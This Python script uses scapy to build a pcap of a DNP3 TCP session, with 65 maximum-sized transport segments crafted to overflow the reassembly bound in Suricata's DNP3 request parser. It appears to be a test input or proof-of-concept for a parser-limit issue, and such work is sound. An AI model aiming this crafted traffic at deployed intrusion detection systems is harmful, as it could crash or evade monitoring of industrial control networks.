#!/usr/bin/env python3
# Generate a DNP3 TCP pcap whose request application reassembly exceeds
# Suricata's DNP3 transport sequence-space bound.

import struct
from scapy.all import Ether, IP, TCP, Raw, wrpcap

MODE = "request"
OUT = "input.pcap"
DNP3_BLOCK_SIZE = 16
DNP3_CRC_LEN = 2
CLIENT = "10.0.0.1"
SERVER = "10.0.0.2"
SPORT = 12345
DPORT = 20000
ETH_C2S = Ether(src="00:00:00:00:00:01", dst="00:00:00:00:00:02")
ETH_S2C = Ether(src="00:00:00:00:00:02", dst="00:00:00:00:00:01")

CRC_TABLE = [
    0x0000, 0x365e, 0x6cbc, 0x5ae2, 0xd978, 0xef26, 0xb5c4, 0x839a,
    0xff89, 0xc9d7, 0x9335, 0xa56b, 0x26f1, 0x10af, 0x4a4d, 0x7c13,
    0xb26b, 0x8435, 0xded7, 0xe889, 0x6b13, 0x5d4d, 0x07af, 0x31f1,
    0x4de2, 0x7bbc, 0x215e, 0x1700, 0x949a, 0xa2c4, 0xf826, 0xce78,
    0x29af, 0x1ff1, 0x4513, 0x734d, 0xf0d7, 0xc689, 0x9c6b, 0xaa35,
    0xd626, 0xe078, 0xba9a, 0x8cc4, 0x0f5e, 0x3900, 0x63e2, 0x55bc,
    0x9bc4, 0xad9a, 0xf778, 0xc126, 0x42bc, 0x74e2, 0x2e00, 0x185e,
    0x644d, 0x5213, 0x08f1, 0x3eaf, 0xbd35, 0x8b6b, 0xd189, 0xe7d7,
    0x535e, 0x6500, 0x3fe2, 0x09bc, 0x8a26, 0xbc78, 0xe69a, 0xd0c4,
    0xacd7, 0x9a89, 0xc06b, 0xf635, 0x75af, 0x43f1, 0x1913, 0x2f4d,
    0xe135, 0xd76b, 0x8d89, 0xbbd7, 0x384d, 0x0e13, 0x54f1, 0x62af,
    0x1ebc, 0x28e2, 0x7200, 0x445e, 0xc7c4, 0xf19a, 0xab78, 0x9d26,
    0x7af1, 0x4caf, 0x164d, 0x2013, 0xa389, 0x95d7, 0xcf35, 0xf96b,
    0x8578, 0xb326, 0xe9c4, 0xdf9a, 0x5c00, 0x6a5e, 0x30bc, 0x06e2,
    0xc89a, 0xfec4, 0xa426, 0x9278, 0x11e2, 0x27bc, 0x7d5e, 0x4b00,
    0x3713, 0x014d, 0x5baf, 0x6df1, 0xee6b, 0xd835, 0x82d7, 0xb489,
    0xa6bc, 0x90e2, 0xca00, 0xfc5e, 0x7fc4, 0x499a, 0x1378, 0x2526,
    0x5935, 0x6f6b, 0x3589, 0x03d7, 0x804d, 0xb613, 0xecf1, 0xdaaf,
    0x14d7, 0x2289, 0x786b, 0x4e35, 0xcdaf, 0xfbf1, 0xa113, 0x974d,
    0xeb5e, 0xdd00, 0x87e2, 0xb1bc, 0x3226, 0x0478, 0x5e9a, 0x68c4,
    0x8f13, 0xb94d, 0xe3af, 0xd5f1, 0x566b, 0x6035, 0x3ad7, 0x0c89,
    0x709a, 0x46c4, 0x1c26, 0x2a78, 0xa9e2, 0x9fbc, 0xc55e, 0xf300,
    0x3d78, 0x0b26, 0x51c4, 0x679a, 0xe400, 0xd25e, 0x88bc, 0xbee2,
    0xc2f1, 0xf4af, 0xae4d, 0x9813, 0x1b89, 0x2dd7, 0x7735, 0x416b,
    0xf5e2, 0xc3bc, 0x995e, 0xaf00, 0x2c9a, 0x1ac4, 0x4026, 0x7678,
    0x0a6b, 0x3c35, 0x66d7, 0x5089, 0xd313, 0xe54d, 0xbfaf, 0x89f1,
    0x4789, 0x71d7, 0x2b35, 0x1d6b, 0x9ef1, 0xa8af, 0xf24d, 0xc413,
    0xb800, 0x8e5e, 0xd4bc, 0xe2e2, 0x6178, 0x5726, 0x0dc4, 0x3b9a,
    0xdc4d, 0xea13, 0xb0f1, 0x86af, 0x0535, 0x336b, 0x6989, 0x5fd7,
    0x23c4, 0x159a, 0x4f78, 0x7926, 0xfabc, 0xcce2, 0x9600, 0xa05e,
    0x6e26, 0x5878, 0x029a, 0x34c4, 0xb75e, 0x8100, 0xdbe2, 0xedbc,
    0x91af, 0xa7f1, 0xfd13, 0xcb4d, 0x48d7, 0x7e89, 0x246b, 0x1235,
]

def crc(data):
    c = 0
    for b in data:
        idx = (c ^ b) & 0xff
        c = (CRC_TABLE[idx] ^ (c >> 8)) & 0xffff
    return (~c) & 0xffff

def with_crc(data):
    c = crc(data)
    return data + bytes([c & 0xff, c >> 8])

def dnp3_frame(user_data, request=True):
    # Link header length includes control, dst, src, and user data, but no CRCs.
    link_len = 5 + len(user_data)
    assert link_len <= 255
    control = 0xc4 if request else 0x44
    dst, src = (2, 3) if request else (3, 2)
    hdr_no_crc = b"\x05\x64" + bytes([link_len, control]) + struct.pack("<HH", dst, src)
    out = with_crc(hdr_no_crc)
    for i in range(0, len(user_data), DNP3_BLOCK_SIZE):
        out += with_crc(user_data[i:i + DNP3_BLOCK_SIZE])
    return out

def make_user_data(i, request=True):
    th = (0x40 if i == 0 else 0x00) | (i % 64)  # FIR on first only, no FIN.
    if i == 0:
        if request:
            app = b"\xc0\x01"  # application FIR|FIN, READ
        else:
            app = b"\xc0\x81\x00\x00"  # RESPONSE + IIN
        filler = bytes([0x41 + (i % 26)]) * (250 - 1 - len(app))
        return bytes([th]) + app + filler
    return bytes([th]) + bytes([0x41 + (i % 26)]) * 249

def packet(src, sport, dst, dport, seq, ack, payload=b"", flags="PA"):
    eth = ETH_C2S if src == CLIENT else ETH_S2C
    return eth.copy() / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=flags) / Raw(payload)

def main():
    pkts = []
    cseq = 1000
    sseq = 2000
    pkts.append(ETH_C2S.copy()/IP(src=CLIENT,dst=SERVER)/TCP(sport=SPORT,dport=DPORT,seq=cseq,flags="S"))
    cseq += 1
    pkts.append(ETH_S2C.copy()/IP(src=SERVER,dst=CLIENT)/TCP(sport=DPORT,dport=SPORT,seq=sseq,ack=cseq,flags="SA"))
    sseq += 1
    pkts.append(ETH_C2S.copy()/IP(src=CLIENT,dst=SERVER)/TCP(sport=SPORT,dport=DPORT,seq=cseq,ack=sseq,flags="A"))

    request = MODE == "request"
    # 65 max-sized transport segments reassemble to 65 * 249 = 16185 bytes,
    # exceeding the 63 * 0xff bound in the request-side guard.
    for i in range(65):
        frame = dnp3_frame(make_user_data(i, request), request=request)
        if request:
            pkts.append(packet(CLIENT, SPORT, SERVER, DPORT, cseq, sseq, frame))
            cseq += len(frame)
            pkts.append(ETH_S2C.copy()/IP(src=SERVER,dst=CLIENT)/TCP(sport=DPORT,dport=SPORT,seq=sseq,ack=cseq,flags="A"))
        else:
            pkts.append(packet(SERVER, DPORT, CLIENT, SPORT, sseq, cseq, frame))
            sseq += len(frame)
            pkts.append(ETH_C2S.copy()/IP(src=CLIENT,dst=SERVER)/TCP(sport=SPORT,dport=DPORT,seq=cseq,ack=sseq,flags="A"))

    wrpcap(OUT, pkts)

if __name__ == "__main__":
    main()
